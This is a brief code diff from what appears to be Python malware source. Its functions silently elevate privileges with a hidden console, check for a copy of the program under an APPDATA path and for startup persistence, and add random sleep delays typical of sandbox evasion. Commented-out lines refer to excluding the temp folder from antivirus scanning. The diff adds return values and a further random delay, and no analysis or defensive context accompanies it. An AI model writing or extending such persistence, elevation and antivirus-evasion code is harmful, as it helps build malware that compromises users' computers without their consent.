@@ -42,11 +42,13 @@ def elevate_script():
     if not os.path.exists(conf.APPDATA_EXE):
         elevate(show_console=False)
         time.sleep(generate_random_int())
+        return True
 
         # exclude_path_antivirus(tempfile.gettempdir())
         # add_exception()
     else:
         time.sleep(generate_random_int())
+        return False
 
 
 
@@ -64,7 +66,7 @@ def test_for_startup_app():
         time.sleep(random_dur)
         return True
     else:
-        # time.sleep(random.randint(1,10))
+        time.sleep(generate_random_int())
         return False
 
 def generate_random_int(starting_num=conf.__start_time, ending_num=conf.__end_time):
